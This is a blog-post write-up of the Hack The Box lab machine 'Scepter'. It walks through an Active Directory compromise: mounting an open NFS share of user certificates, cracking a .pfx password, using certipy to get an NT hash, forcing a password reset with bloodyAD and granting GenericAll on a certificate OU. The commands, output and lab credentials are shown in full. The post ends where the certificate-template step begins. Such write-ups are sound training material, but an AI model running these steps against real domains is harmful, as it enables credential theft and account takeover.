<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Foued SAIDI">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://fouedsaidi.com/2025/07/18/hackthebox-scepter/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="OverviewScepter is a hard-difficulty machine from Hack The Box that deals initially with an exposed rpc endpoint that we can mount onto our machine providing us with keys and certificates to impersona">
<meta property="og:type" content="article">
<meta property="og:title" content="Hackthebox: Scepter">
<meta property="og:url" content="http://fouedsaidi.com/2025/07/18/Hackthebox-Scepter/index.html">
<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
<meta property="og:description" content="OverviewScepter is a hard-difficulty machine from Hack The Box that deals initially with an exposed rpc endpoint that we can mount onto our machine providing us with keys and certificates to impersona">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Scepter/Scepter.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Scepter/blood.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Scepter/blood1.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Scepter/blood2.png">
<meta property="article:published_time" content="2025-07-18T10:23:45.000Z">
<meta property="article:modified_time" content="2025-07-18T11:10:32.000Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Scepter/Scepter.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
    <meta name="theme-color" content="#5618ff">
    <link rel="shortcut icon" href="/images/logo.png">
    <!--- Page Info-->
    
    <title>
        
            Hackthebox: Scepter -
        
        Foued Saidi&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI ðŸ‘‹","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Foued Saidi&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/about">ME
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/about">ME</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Scepter</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/logo.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-07-18 11:23:45</span>
        <span class="mobile">2025-07-18 11:23:45</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-07-18 12:10:32</span>
            <span class="mobile">2025-07-18 12:10:32</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Scepter is a hard-difficulty machine from Hack The Box that deals initially with an exposed rpc endpoint that we can mount onto our machine providing us with keys and certificates to impersonate d.baker user. Weâ€™ll then abuse ForceChangePassword to get a.carter who can abuse ESC14 and get h.brown which will re-abuse the vulnerable template again to land access on p.adams who has DCSync privileges.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Scepter/Scepter.png"
                      alt="Scepter-info-card"
                ><figcaption>Scepter-info-card</figcaption></figure></p>
<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>We can see rpcbind on port 111 with nfs (network file system), then we can mount it :</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ rpcinfo  -p 10.10.11.65</span><br><span class="line">   program vers proto   port  service</span><br><span class="line">    100000    2   udp    111  portmapper</span><br><span class="line">    100000    3   udp    111  portmapper</span><br><span class="line">    100000    4   udp    111  portmapper</span><br><span class="line">    100000    2   tcp    111  portmapper</span><br><span class="line">    100000    3   tcp    111  portmapper</span><br><span class="line">    100000    4   tcp    111  portmapper</span><br><span class="line">    100003    2   tcp   2049  nfs</span><br><span class="line">    100003    3   tcp   2049  nfs</span><br><span class="line">    100003    2   udp   2049  nfs</span><br><span class="line">    100003    3   udp   2049  nfs</span><br><span class="line">    100003    4   tcp   2049  nfs</span><br><span class="line">    100005    1   tcp   2049  mountd</span><br><span class="line">    100005    2   tcp   2049  mountd</span><br><span class="line">    100005    3   tcp   2049  mountd</span><br><span class="line">    100005    1   udp   2049  mountd</span><br><span class="line">    100005    2   udp   2049  mountd</span><br><span class="line">    100005    3   udp   2049  mountd</span><br><span class="line">    100021    1   tcp   2049  nlockmgr</span><br><span class="line">    100021    2   tcp   2049  nlockmgr</span><br><span class="line">    100021    3   tcp   2049  nlockmgr</span><br><span class="line">    100021    4   tcp   2049  nlockmgr</span><br><span class="line">    100021    1   udp   2049  nlockmgr</span><br><span class="line">    100021    2   udp   2049  nlockmgr</span><br><span class="line">    100021    3   udp   2049  nlockmgr</span><br><span class="line">    100021    4   udp   2049  nlockmgr</span><br><span class="line">    100024    1   tcp   2049  status</span><br><span class="line">    100024    1   udp   2049  status</span><br></pre></td></tr></table></figure></div>

<p>Now we mount it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ showmount -e 10.10.11.65    </span><br><span class="line">Export list <span class="keyword">for</span> 10.10.11.65:</span><br><span class="line">/helpdesk (everyone)</span><br><span class="line">                     </span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/Scepter]</span><br><span class="line">â””â”€$ sudo mount -t nfs 10.10.11.65:/helpdesk nfs_share</span><br><span class="line">                                                                                                                                                                                                     </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/Scepter]</span><br><span class="line">â””â”€$ sudo su          </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Hackthebox/Scepter]</span><br><span class="line">â””â”€<span class="comment"># cd nfs_share       </span></span><br><span class="line">                                                                                                                                                                                                     </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Hackthebox/Scepter/nfs_share]</span><br><span class="line">â””â”€<span class="comment"># ls                        </span></span><br><span class="line">baker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx</span><br></pre></td></tr></table></figure></div>


<p>We find the user <code>baker</code>â€˜s certs and keys, we can use openssl to create a certificate that we can use to auth as the user:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Hackthebox/Scepter/nfs_share]</span><br><span class="line">â””â”€<span class="comment"># openssl pkcs12 -export -out d.baker.pfx -inkey baker.key -in baker.crt</span></span><br><span class="line">Enter pass phrase <span class="keyword">for</span> baker.key:</span><br><span class="line">Enter pass phrase <span class="keyword">for</span> baker.key:</span><br><span class="line">Enter pass phrase <span class="keyword">for</span> baker.key:</span><br><span class="line">Could not find private key from -inkey file from baker.key</span><br><span class="line">4087DAB95F7F0000:error:1608010C:STORE routines:ossl_store_handle_load_result:unsupported:../crypto/store/store_result.c:151:</span><br><span class="line">4087DAB95F7F0000:error:07880109:common libcrypto routines:do_ui_passphrase:interrupted or cancelled:../crypto/passphrase.c:178:</span><br><span class="line">4087DAB95F7F0000:error:1C80009F:Provider routines:epki2pki_decode:unable to get passphrase:../providers/implementations/encode_decode/decode_epki2pki.c:121:</span><br><span class="line">                                           </span><br></pre></td></tr></table></figure></div>

<p>But now we need a password for the pfx file, we can do so using pfx2john:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Hackthebox/Scepter]</span><br><span class="line">â””â”€<span class="comment">#  john  -w=/usr/share/wordlists/rockyou.txt pfx_hash.txt </span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (pfx, (.pfx, .p12) [PKCS<span class="comment">#12 PBE (SHA1/SHA2) 128/128 AVX 4x])</span></span><br><span class="line">Cost 1 (iteration count) is 2048 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">newpassword      (clark.pfx)     </span><br><span class="line">1g 0:00:00:00 DONE (2025-04-22 18:57) 2.040g/s 10448p/s 10448c/s 10448C/s Liverpool..babygrl</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>

<p>And now we decrypt it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Hackthebox/Scepter/nfs_share]</span><br><span class="line">â””â”€<span class="comment"># openssl pkcs12 -export -out ../d.baker.pfx -inkey baker.key -in baker.crt</span></span><br><span class="line">Enter pass phrase <span class="keyword">for</span> baker.key:</span><br><span class="line">Enter Export Password:</span><br><span class="line">Verifying - Enter Export Password:</span><br></pre></td></tr></table></figure></div>

<p>The password is <code>newpassword</code>.</p>
<p>And now we can use that cert to authenticate as d.baker and get his hash:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Hackthebox/Scepter]</span><br><span class="line">â””â”€<span class="comment"># ntpdate scepter.htb      </span></span><br><span class="line">2025-04-23 03:00:43.437361 (+0000) +28805.743118 +/- 0.026259 scepter.htb 10.10.11.65 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 28805.743118</span><br><span class="line">                                                                                                                                                                                                     </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Hackthebox/Scepter]</span><br><span class="line">â””â”€<span class="comment"># certipy-ad auth -pfx d.baker.pfx  -dc-ip &#x27;10.10.11.65&#x27; -username &#x27;d.baker&#x27; -domain &#x27;scepter.htb&#x27;</span></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: d.baker@scepter.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;d.baker.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;d.baker&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;d.baker@scepter.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce</span><br><span class="line">                                                     </span><br></pre></td></tr></table></figure></div>

<p>Now we can start our enumeration using <code>bloodhound-python</code>:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/Scepter]</span><br><span class="line">â””â”€$ bloodhound-python -u <span class="string">&#x27;d.baker&#x27;</span> --hashes <span class="string">&#x27;:18b5fb0d99e7a475316213c15b6f22ce&#x27;</span> -ns 10.10.11.65 -d scepter.htb  -c All --zip</span><br><span class="line">INFO: BloodHound.py <span class="keyword">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)</span><br><span class="line">INFO: Found AD domain: scepter.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.scepter.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc01.scepter.htb</span><br><span class="line">INFO: Found 11 <span class="built_in">users</span></span><br><span class="line">INFO: Found 57 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 3 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc01.scepter.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 27S</span><br><span class="line">INFO: Compressing output into 20250423032837_bloodhound.zip</span><br></pre></td></tr></table></figure></div>

<p>We can see that d.baker user can change a.carterâ€™s password<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Scepter/blood.png"
                      alt="ForceChangePassword"
                ><figcaption>ForceChangePassword</figcaption></figure></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/Scepter]</span><br><span class="line">â””â”€$ sudo ntpdate scepter.htb</span><br><span class="line">2025-04-23 04:31:52.887861 (+0000) +2744.807951 +/- 0.025757 scepter.htb 10.10.11.65 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 2744.807951</span><br><span class="line">                                                                                                                                                                                                     </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/Scepter]</span><br><span class="line">â””â”€$ getTGT.py -no-pass -hashes :18b5fb0d99e7a475316213c15b6f22ce scepter.htb/<span class="string">&#x27;d.baker&#x27;</span>@dc01.scepter.htb</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> d.baker@dc01.scepter.htb.ccache</span><br><span class="line">                                                                                                                                                                                                     </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/Scepter]</span><br><span class="line">â””â”€$ <span class="built_in">export</span> KRB5CCNAME=d.baker@dc01.scepter.htb.ccache </span><br><span class="line">                                                                                                                                                                                                     </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/Scepter]</span><br><span class="line">â””â”€$ bloodyAD -d scepter.htb -u d.baker -k --host dc01.scepter.htb --dc-ip 10.10.11.65 <span class="built_in">set</span> password a.carter Password123!</span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure></div>

<p>Later we can see a.carter is a member of IT Support who have GenericAll on STAFF ACCESS CERTIFICATE:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Scepter/blood1.png"
                      alt="ForceChangePassword"
                ><figcaption>ForceChangePassword</figcaption></figure></p>
<p>So first I add GenericAll to a.carter:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                                                                                                     </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/Scepter]</span><br><span class="line">â””â”€$ bloodyAD -d scepter.htb -u a.carter -p Password123! --host dc01.scepter.htb --dc-ip 10.10.11.65 add genericAll <span class="string">&quot;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&quot;</span> a.carter</span><br><span class="line">[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB</span><br></pre></td></tr></table></figure></div>

<p>Then looking at vulnerable certificates using certipy:</p>
